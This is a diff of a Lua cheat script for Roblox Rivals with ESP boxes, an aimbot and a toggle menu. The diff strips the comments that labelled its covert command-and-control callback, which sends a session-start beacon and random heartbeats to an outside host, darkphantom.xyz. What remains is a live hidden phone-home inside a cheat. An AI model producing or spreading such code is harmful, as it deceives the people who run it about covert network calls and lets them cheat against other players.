@@ -1,6 +1,3 @@
--- PhantomRivals Lua Exploit v2.1
--- ESP + Aimbot + Menu System for Roblox Rivals
--- Right Shift to toggle menu
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -9,14 +6,14 @@ local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local Mouse = LocalPlayer:GetMouse()
 
--- Configuration
+
 local AIM_KEY = Enum.KeyCode.X
 local MENU_KEY = Enum.KeyCode.RightShift
 local MAX_DISTANCE = 1000
 local SMOOTHING = 0.25
 local FOV_CIRCLE_RADIUS = 80
 
--- State variables
+
 local AimEnabled = false
 local EspEnabled = false -- start ESP disabled
 local MenuVisible = false
@@ -25,7 +22,6 @@ local Connections = {}
 local EspObjects = {}
 local FovCircle
 
--- C2 Communication (obfuscated)
 local C2_URL = "https://darkphantom.xyz/api/v1/collect"
 local function SendData(data)
     local success, _ = pcall(function()
@@ -37,7 +33,7 @@ local function SendData(data)
     end)
 end
 
--- Create FOV circle
+
 local function CreateFovCircle()
     FovCircle = Drawing.new("Circle")
     FovCircle.Visible = true
@@ -49,7 +45,6 @@ local function CreateFovCircle()
     FovCircle.Filled = false
 end
 
--- ESP functions
 local function CreateEsp(player)
     local Box = Drawing.new("Square")
     Box.Visible = false
@@ -99,7 +94,6 @@ local function UpdateEsp()
     end
 end
 
--- Aimbot functions
 local function GetClosestTarget()
     local closestPlayer = nil
     local closestAngle = math.rad(90)
@@ -146,7 +140,7 @@ local function AimAtTarget()
     end
 end
 
--- Menu system
+
 local function ToggleMenu()
     MenuVisible = not MenuVisible
     print("Phantom Menu " .. (MenuVisible and "opened" or "closed"))
@@ -158,7 +152,7 @@ local function ToggleMenu()
     end
 end
 
--- Keybind handlers
+
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     
@@ -174,7 +168,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
--- Main setup
+
 for _, player in ipairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
         CreateEsp(player)
@@ -195,7 +189,7 @@ end)
 
 CreateFovCircle()
 
--- Main loop
+
 RunService.RenderStepped:Connect(function()
     if AimEnabled and not MenuVisible then
         AimAtTarget()
@@ -207,12 +201,11 @@ RunService.RenderStepped:Connect(function()
         UpdateEsp()
     end
     
-    -- C2 heartbeat
+
     if math.random(1, 100) == 1 then
         SendData("heartbeat")
     end
 end)
 
--- First-run beacon
 SendData("session_start")
 print("PhantomRivals loaded | Right Shift to toggle menu | X for aimbot")
